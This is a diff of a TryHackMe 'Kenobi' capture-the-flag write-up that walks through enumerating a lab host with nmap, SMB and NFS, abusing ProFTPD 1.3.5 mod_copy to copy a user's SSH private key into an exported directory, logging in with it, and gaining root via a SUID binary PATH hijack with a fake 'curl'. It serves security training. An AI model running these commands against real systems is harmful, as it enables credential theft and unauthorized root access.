@@ -1,150 +1,205 @@
-# Kenobi
+# TryHackMe - Kenobi
 
-First
-```
-❯ nmap 10.48.190.52
-Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:04 +0600
-❯ nmap -T4 10.48.190.52
-Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:04 +0600
-Nmap scan report for 10.48.190.52
-Host is up (0.046s latency).
-Not shown: 993 closed tcp ports (conn-refused)
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-80/tcp   open  http
-111/tcp  open  rpcbind
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-2049/tcp open  nfs
+[ROOM](https://tryhackme.com/room/kenobi)
 
-Nmap done: 1 IP address (1 host up) scanned in 26.77 seconds
-❯ nmap -sC -sV -p21,22,80,111,139,44,2049 10.48.190.52
-Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:06 +0600
-Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
-Nmap done: 1 IP address (0 hosts up) scanned in 3.45 seconds
-❯ nmap -sC -sV -p21,22,80,111,139,44,2049 10.48.190.52
-Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:06 +0600
-Nmap scan report for 10.48.190.52
-Host is up (0.13s latency).
+## 1. Reconnaissance
 
-PORT     STATE  SERVICE     VERSION
-21/tcp   open   ftp         ProFTPD 1.3.5
-|_vmware-version: ERROR: Script execution failed (use -d to debug)
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
-22/tcp   open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 6b:3d:40:12:d0:fc:7f:d0:e4:83:b2:c5:d5:f7:50:9e (RSA)
-|   256 e0:ce:2f:d6:71:d6:e7:53:af:bc:5f:11:18:40:d8:01 (ECDSA)
-|_  256 b4:a9:e3:b9:94:d0:0f:3c:3d:79:95:32:72:8d:0b:c4 (ED25519)
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
-|_vmware-version: ERROR: Script execution failed (use -d to debug)
-44/tcp   closed mpm-flags
-80/tcp   open   http        Apache httpd 2.4.41 ((Ubuntu))
-|_http-trane-info: ERROR: Script execution failed (use -d to debug)
-|_https-redirect: ERROR: Script execution failed (use -d to debug)
-|_hnap-info: ERROR: Script execution failed (use -d to debug)
-| http-robots.txt: 1 disallowed entry 
-|_/admin.html
-|_vmware-version: ERROR: Script execution failed (use -d to debug)
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
-|_http-server-header: ERROR: Script execution failed (use -d to debug)
-|_http-title: Site doesn't have a title (text/html).
-111/tcp  open   rpcbind
-|_vmware-version: ERROR: Script execution failed (use -d to debug)
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
-|_rpc-grind: ERROR: Script execution failed (use -d to debug)
-139/tcp  open   netbios-ssn Samba smbd 4
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
-|_vmware-version: ERROR: Script execution failed (use -d to debug)
-2049/tcp open   rpcbind
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
-|_vmware-version: ERROR: Script execution failed (use -d to debug)
-|_rpc-grind: ERROR: Script execution failed (use -d to debug)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+I started by scanning the target using Nmap to identify open ports.
 
-Host script results:
-|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb2-time: 
-|   date: 2026-10-22T10:06:56
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 24.64 seconds
+```bash
+nmap -T4 10.48.190.52
 ```
 
-Then
-```
-❯ smbclient -N -L //10.48.190.52
-Can't load /etc/samba/smb.conf - run testparm to debug it
+The scan revealed the following open ports:
 
-	Sharename       Type      Comment
-	---------       ----      -------
-	print$          Disk      Printer Drivers
-	anonymous       Disk      
-	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
-SMB1 disabled -- no workgroup available
-❯ smbclient //10.48.190.52/anonymous
-Can't load /etc/samba/smb.conf - run testparm to debug it
-Password for [WORKGROUP\leon]:
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Wed Sep  4 16:49:09 2019
-  ..                                  D        0  Sat Aug  9 19:03:22 2025
-  log.txt                             N    12237  Wed Sep  4 16:49:09 2019
+| Port | Service |
+|---|---|
+| 21 | FTP |
+| 22 | SSH |
+| 80 | HTTP |
+| 111 | RPCBind |
+| 139 | NetBIOS |
+| 445 | SMB |
+| 2049 | NFS |
 
-		9183416 blocks of size 1024. 2916696 blocks available
-smb: \> get log.txt
-getting file \log.txt of size 12237 as log.txt (24.7 KiloBytes/sec) (average 24.7 KiloBytes/sec)
-smb: \> exit
+Next, I performed service and version detection:
 
-~
-❯
+```bash
+nmap -sC -sV -p21,22,80,111,139,445,2049 10.48.190.52
 ```
 
-```
-❯ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.190.52
-Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:13 +0600
-Nmap scan report for 10.48.190.52
-Host is up (0.10s latency).
+The important findings were:
 
-PORT    STATE SERVICE
-111/tcp open  rpcbind
-| nfs-showmount: 
-|_  /var *
+- FTP: ProFTPD 1.3.5
+- SSH: OpenSSH 8.2p1
+- HTTP: Apache 2.4.41
+- SMB: Samba
+- NFS: Available
 
-Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
+The web server's `robots.txt` also revealed `/admin.html`, which could be investigated later.
 
-~
+## 2. SMB Enumeration
+
+I enumerated the available SMB shares using `smbclient`.
+
+```bash
+smbclient -N -L //10.48.190.52
 ```
 
-```
-❯ nc 10.48.190.52 21
-220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.190.52]
-```
-Found `ProFTPD 1.3.5` version, using this search on exploit-db
+The server exposed an `anonymous` share that was accessible without authentication.
 
-The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
-We know the username is kenobi so we can do this:
+I connected to the share and downloaded `log.txt`.
+
+```bash
+smbclient //10.48.190.52/anonymous
 ```
-❯ nc 10.48.190.52 21
-220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.190.52]
+
+Inside the SMB prompt:
+
+```text
+ls
+get log.txt
+exit
+```
+
+I saved the file locally for further analysis.
+
+## 3. NFS Enumeration
+
+Next, I checked for accessible NFS exports.
+
+```bash
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.190.52
+```
+
+The scan revealed that `/var` was exported:
+
+```text
+/var *
+```
+
+This was an important finding because the exported directory could later be used to retrieve a file copied into it on the target.
+
+## 4. Exploiting ProFTPD 1.3.5
+
+I connected to the FTP service to confirm its version.
+
+```bash
+nc 10.48.190.52 21
+```
+
+The server identified itself as ProFTPD 1.3.5. I researched the version and found that its `mod_copy` functionality supports the `SITE CPFR` and `SITE CPTO` commands, which can copy files between locations on the server when the relevant functionality is enabled.
+
+Since the username `kenobi` was known, I attempted to copy its SSH private key into the NFS-exported directory.
+
+```text
 SITE CPFR /home/kenobi/.ssh/id_rsa
-350 File or directory exists, ready for destination name
-. 
-500 . not understood
-/var/tmp/id_rsa
-500 /VAR/TMP/ID RSA not understood
 SITE CPTO /var/tmp/id_rsa
+```
+
+The server returned:
+
+```text
+350 File or directory exists, ready for destination name
 250 Copy successful
 ```
 
+The successful copy placed the SSH private key at `/var/tmp/id_rsa`.
 
+## 5. Retrieving the SSH Private Key Through NFS
 
+I created a local mount point and mounted the target's exported `/var` directory.
 
+```bash
+sudo mkdir -p /mnt/kenobiNFS
+sudo mount -t nfs -o vers=3 10.48.190.52:/var /mnt/kenobiNFS
+```
 
+I verified the mounted directory and copied the private key to my working directory.
 
+```bash
+ls -la /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa .
+```
+
+After retrieving the key, I unmounted the NFS share.
+
+```bash
+sudo umount /mnt/kenobiNFS
+```
+
+Before using the private key, I restricted its permissions and connected over SSH.
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.48.190.52
+```
+
+This successfully provided access as `kenobi`.
+
+## 6. Capturing the User Flag
+
+After logging in, I listed the home directory and found `user.txt`.
+
+```bash
+ls
+cat user.txt
+```
+
+**User flag obtained.**
+
+## 7. Privilege Escalation
+
+To identify potential privilege escalation paths, I searched for SUID binaries.
+
+```bash
+find / -type f -perm -4000 2>/dev/null
+```
+
+Among the results, `/usr/bin/menu` stood out as an unusual executable.
+
+I inspected its strings:
+
+```bash
+strings /usr/bin/menu
+```
+
+The output revealed that the program called system commands such as `curl`, `uname`, and `ifconfig`. This suggested that the executable might rely on commands resolved through the system's `PATH`.
+
+I checked the current `PATH`:
+
+```bash
+echo $PATH
+```
+
+I then created a replacement executable named `curl` in `/tmp` and placed that directory first in `PATH`.
+
+```bash
+cd /tmp
+echo "/bin/sh" > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+```
+
+I ran the menu program again:
+
+```bash
+/usr/bin/menu
+```
+
+Selecting the relevant menu option caused the program to invoke the replacement command. Because the SUID executable ran with elevated privileges, this provided a root shell.
+
+I verified the result:
+
+```bash
+whoami
+```
+
+The output was:
+
+```text
+root
+```
+
+**Root access obtained.**
 
